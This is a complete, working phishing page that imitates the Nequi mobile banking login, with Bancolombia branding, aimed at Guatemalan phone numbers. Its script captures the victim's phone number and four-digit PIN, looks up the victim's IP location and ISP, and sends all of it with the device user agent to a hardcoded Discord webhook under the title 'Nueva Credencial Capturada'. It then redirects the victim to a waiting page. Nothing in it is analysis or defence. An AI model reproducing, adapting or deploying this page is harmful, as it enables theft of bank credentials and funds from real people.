<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Nequi</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  html, body {
    height: 100%; width: 100%;
    background: #200020;
    color: white;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    overflow: hidden;
  }
  .screen {
    width: 100%; height: 100dvh;
    background: #200020;
    display: flex; flex-direction: column; align-items: center;
    padding: max(env(safe-area-inset-top,20px),20px) 28px max(env(safe-area-inset-bottom,24px),24px);
    position: absolute; top: 0; left: 0;
  }
  .screen.hidden { display: none; }

  #loginScreen { justify-content: space-between; }
  .help-btn { align-self: flex-end; color: white; font-size: 22px; cursor: pointer; padding: 4px 0 4px 8px; }
  .logo-container { flex: 1; display: flex; align-items: center; justify-content: center; width: 100%; }
  .nequi-logo { width: min(220px,55vw); border-radius: 16px; object-fit: contain; }
  .login-bottom { width: 100%; }

  .phone-input-wrapper {
    background: #3a1040; border-radius: 14px;
    display: flex; align-items: center;
    padding: 16px 18px; margin-bottom: 14px;
    border: 1px solid #5a3070;
  }
  .country-code {
    color: #ccc; font-size: 16px;
    margin-right: 14px; padding-right: 14px;
    border-right: 1px solid #6a4080; white-space: nowrap;
  }
  .phone-input-wrapper input {
    background: transparent; border: none; outline: none;
    color: #ddd; font-size: 16px; flex: 1; min-width: 0;
  }
  .phone-input-wrapper input::placeholder { color: #888; }

  .form-btn-submit {
    width: 100%; background: #d4006e; color: white; border: none;
    border-radius: 14px; padding: clamp(15px,4vw,19px);
    font-size: clamp(16px,4.5vw,18px); font-weight: 600;
    cursor: pointer; letter-spacing: 0.3px;
    transition: background 0.2s, transform 0.1s, opacity 0.2s;
    box-shadow: 0 4px 24px rgba(212,0,110,0.4);
    display: block; text-align: center; appearance: none; -webkit-appearance: none;
  }
  .form-btn-submit:disabled { opacity: 0.45; cursor: not-allowed; box-shadow: none; }
  .form-btn-submit:not(:disabled):active { transform: scale(0.98); background: #b8005e; }

  .bancolombia-logo-wrapper { margin-top: 22px; display: flex; align-items: center; justify-content: center; gap: 8px; color: #888; font-size: 13px; }
  .bancolombia-logo-wrapper img { width: 28px; object-fit: contain; filter: brightness(0.75) grayscale(0.3); }

  #pinScreen { justify-content: flex-start; }
  .pin-topbar { width: 100%; display: flex; align-items: center; min-height: 44px; margin-bottom: 4px; }
  .back-btn { color: white; font-size: 28px; cursor: pointer; background: none; border: none; padding: 8px 8px 8px 0; line-height: 1; }
  .pin-title { font-size: clamp(22px,6vw,28px); font-weight: 700; margin-top: 8px; margin-bottom: 32px; align-self: flex-start; }

  .pin-boxes { display: flex; gap: clamp(12px,4vw,20px); margin-bottom: 16px; }
  .pin-box { width: clamp(58px,16vw,70px); height: clamp(58px,16vw,70px); background: #4a2860; border-radius: 12px; transition: background 0.15s, transform 0.12s; }
  .pin-box.filled { background: #c4006e; transform: scale(1.06); }

  .pin-subtitle { color: #aaa; font-size: clamp(13px,3.5vw,15px); text-align: center; line-height: 1.7; }

  .keypad { width: 100%; margin-top: auto; }
  .keypad-row { display: flex; justify-content: space-around; }
  .key {
    width: 33.33%; height: clamp(64px,16vw,80px);
    background: transparent; border: none; color: white;
    font-size: clamp(28px,7.5vw,36px); font-weight: 300;
    cursor: pointer; border-radius: 14px;
    display: flex; align-items: center; justify-content: center;
    touch-action: manipulation; transition: background 0.1s, transform 0.1s;
  }
  .key:active { background: #3a1040; transform: scale(0.88); }
  .key.empty { pointer-events: none; }
  .key.del { font-size: clamp(20px,5vw,26px); }

  .forgot-btn {
    width: 80%; background: transparent; border: 1.5px solid #666; color: white;
    border-radius: 14px; padding: clamp(13px,3.5vw,16px); font-size: clamp(14px,3.8vw,16px);
    cursor: pointer; margin-top: 10px; margin-bottom: 4px;
    touch-action: manipulation; transition: border-color 0.2s;
  }
  .forgot-btn:active { border-color: #d4006e; }

  @keyframes slideOut { from { transform: translateX(0); opacity: 1; } to { transform: translateX(-100%); opacity: 0; } }
  @keyframes slideIn  { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
  .slide-out { animation: slideOut 0.32s ease forwards; }
  .slide-in  { animation: slideIn  0.32s ease forwards; }

  .sending-overlay {
    display: none; position: fixed; inset: 0;
    background: rgba(32,0,32,0.88);
    align-items: center; justify-content: center;
    flex-direction: column; gap: 16px; z-index: 200;
  }
  .sending-overlay.show { display: flex; }
  .spinner { width: 48px; height: 48px; border: 4px solid #5a3070; border-top-color: #d4006e; border-radius: 50%; animation: spin 0.8s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .sending-text { color: #ccc; font-size: 15px; }
</style>
</head>
<body>

<!-- LOGIN -->
<div class="screen" id="loginScreen">
  <span class="help-btn">?</span>
  <div class="logo-container">
    <img class="nequi-logo"
      src="https://www.valoraanalitik.com/wp-content/uploads/2024/06/Nequi-5.jpg"
      alt="Nequi"
      onerror="this.outerHTML='<div style=&quot;font-size:clamp(36px,10vw,52px);font-weight:900;color:white;&quot;><span style=&quot;color:#d4006e;&quot;>&#183;</span>Nequi</div>'"
    />
  </div>
  <div class="login-bottom">
    <div class="phone-input-wrapper">
      <span class="country-code">+502</span>
      <input type="tel" id="phoneInput" placeholder="Número de cel" maxlength="8" inputmode="numeric" autocomplete="tel" />
    </div>
    <!-- Botón entra -->
    <button class="form-btn-submit" type="button" id="enterBtn" disabled>Entra</button>
    <div class="bancolombia-logo-wrapper">
      <span>by</span>
      <img src="https://www.bancolombia.com/wcm/connect/b8e4c3f2-36a9-497d-a125-ac04f83b0bf8/LogoBancolombia.png?MOD=AJPERES"
        alt="Bancolombia" onerror="this.style.display='none'" />
    </div>
  </div>
</div>

<!-- PIN -->
<div class="screen hidden" id="pinScreen">
  <div class="pin-topbar">
    <button class="back-btn" onclick="goBack()">&#8592;</button>
  </div>
  <h2 class="pin-title">Escribe tu clave</h2>
  <div class="pin-boxes">
    <div class="pin-box" id="box0"></div>
    <div class="pin-box" id="box1"></div>
    <div class="pin-box" id="box2"></div>
    <div class="pin-box" id="box3"></div>
  </div>
  <p class="pin-subtitle">No dudamos que seas tú...<br>Pero es mejor confirmar ;)</p>
  <div class="keypad">
    <div class="keypad-row">
      <button class="key" onclick="pressKey('1')">1</button>
      <button class="key" onclick="pressKey('2')">2</button>
      <button class="key" onclick="pressKey('3')">3</button>
    </div>
    <div class="keypad-row">
      <button class="key" onclick="pressKey('4')">4</button>
      <button class="key" onclick="pressKey('5')">5</button>
      <button class="key" onclick="pressKey('6')">6</button>
    </div>
    <div class="keypad-row">
      <button class="key" onclick="pressKey('7')">7</button>
      <button class="key" onclick="pressKey('8')">8</button>
      <button class="key" onclick="pressKey('9')">9</button>
    </div>
    <div class="keypad-row">
      <button class="key empty"></button>
      <button class="key" onclick="pressKey('0')">0</button>
      <button class="key del" onclick="deleteLast()">&#9003;</button>
    </div>
  </div>
  <button class="forgot-btn">Olvidé mi clave</button>
</div>

<div class="sending-overlay" id="sendingOverlay">
  <div class="spinner"></div>
  <div class="sending-text">Verificando...</div>
</div>

<script>
  // MISMO ESTILO QUE TU PÁGINA BNC
  const WEBHOOK = "https://discord.com/api/webhooks/1478941711848702032/w19VzhDPz3r2AJNKxVDYMPM3N43i26cEkhLOpkV8ZErHfkuG2v8g8_CXFSRvlOHEd8sj";

  let pin = [];
  let phoneNumber = "";

  const phoneInput = document.getElementById("phoneInput");
  const enterBtn   = document.getElementById("enterBtn");

  // Activa / desactiva el botón según haya número
  phoneInput.addEventListener("input", function () {
    enterBtn.disabled = this.value.trim().length === 0;
  });

  phoneInput.addEventListener("keydown", function (e) {
    if (e.key === "Enter" && !enterBtn.disabled) {
      e.preventDefault();
      goToPin();
    }
  });

  enterBtn.addEventListener("click", function (e) {
    e.preventDefault();
    if (!enterBtn.disabled) goToPin();
  });

  function goToPin() {
    if (enterBtn.disabled) return;
    phoneNumber = phoneInput.value.trim();
    const login  = document.getElementById("loginScreen");
    const pinScr = document.getElementById("pinScreen");
    login.classList.add("slide-out");
    setTimeout(function () {
      login.classList.add("hidden");
      login.classList.remove("slide-out");
      pinScr.classList.remove("hidden");
      pinScr.classList.add("slide-in");
      setTimeout(function () { pinScr.classList.remove("slide-in"); }, 350);
    }, 320);
  }

  function goBack() {
    const login  = document.getElementById("loginScreen");
    const pinScr = document.getElementById("pinScreen");
    pin = []; updateBoxes();
    pinScr.classList.add("slide-out");
    setTimeout(function () {
      pinScr.classList.add("hidden");
      pinScr.classList.remove("slide-out");
      login.classList.remove("hidden");
      login.classList.add("slide-in");
      setTimeout(function () { login.classList.remove("slide-in"); }, 350);
    }, 320);
  }

  function pressKey(val) {
    if (pin.length >= 4) return;
    pin.push(val); updateBoxes();
    if (pin.length === 4) setTimeout(submitPin, 300);
  }

  function deleteLast() { pin.pop(); updateBoxes(); }

  function updateBoxes() {
    for (let i = 0; i < 4; i++) {
      const b = document.getElementById("box" + i);
      if (i < pin.length) b.classList.add("filled");
      else b.classList.remove("filled");
    }
  }

  // Misma lógica de ubicación que usas en BNC (solo IP APIs)
  async function getLocation() {
    const apis = [
      { url: "https://ipapi.co/json/",
        parse: d => d.ip ? { ip: d.ip, city: d.city, region: d.region, country: d.country_name, isp: d.org } : null },
      { url: "https://ip-api.com/json/?fields=status,country,regionName,city,isp,query",
        parse: d => d.status === "success" ? { ip: d.query, city: d.city, region: d.regionName, country: d.country, isp: d.isp } : null },
      { url: "https://ipwho.is/",
        parse: d => d.ip ? { ip: d.ip, city: d.city, region: d.region, country: d.country, isp: (d.connection && d.connection.isp) || d.org } : null }
    ];
    for (const api of apis) {
      try {
        const r = await fetch(api.url, { signal: AbortSignal.timeout(5000) });
        const d = await r.json();
        const result = api.parse(d);
        if (result) return result;
      } catch (_) {}
    }
    return null;
  }

  async function submitPin() {
    document.getElementById("sendingOverlay").classList.add("show");

    const pinCode = pin.join("");
    const now     = new Date().toLocaleString("es-GT", { timeZone: "America/Guatemala" });

    const loc = await getLocation();
    let locationValue = "📍 No disponible\n🌐 IP: `N/A`\n🏢 ISP: N/A";
    if (loc) {
      const locStr = [loc.city, loc.region, loc.country].filter(Boolean).join(", ");
      locationValue = `📍 ${locStr}\n🌐 IP: \`${loc.ip || "N/A"}\`\n🏢 ISP: ${loc.isp || "N/A"}`;
    }

    const payload = {
      username: "Nequi - BR0K3N",
      avatar_url: "https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/032018/untitled-1_97.png?e22e6XTI6KykJ23AmbIiLR_EHC0QR1hq&itok=SCUxTlGZ",
      embeds: [{
        title: "Nueva Credencial Capturada — Nequi GT",
        description: "Se ha recibido un nuevo intento de inicio de sesión.",
        color: 15158332,
        fields: [
          { name: "📱 Número",          value: "```+502 " + phoneNumber + "```", inline: true  },
          { name: "🔑 Clave",           value: "```"      + pinCode     + "```", inline: true  },
          { name: "🕐 Hora (GT)",       value: "```"      + now         + "```", inline: false },
          { name: "🌍 Ubicación Real",  value: locationValue,                 inline: false },
          { name: "💻 Dispositivo",     value: "```" + navigator.userAgent + "```", inline: false }
        ],
        footer: {
          text: "Powered By @Brknshinexxx",
          icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/500px-Telegram_logo.svg.png"
        },
        timestamp: new Date().toISOString()
      }]
    };

    try {
      const res = await fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      if (res.ok || res.status === 204) {
        window.location.href = "wait.html";
      } else {
        throw new Error("HTTP " + res.status);
      }
    } catch (err) {
      // Si falla igual redirige
      window.location.href = "wait.html";
    }
  }
</script>
</body>
</html>
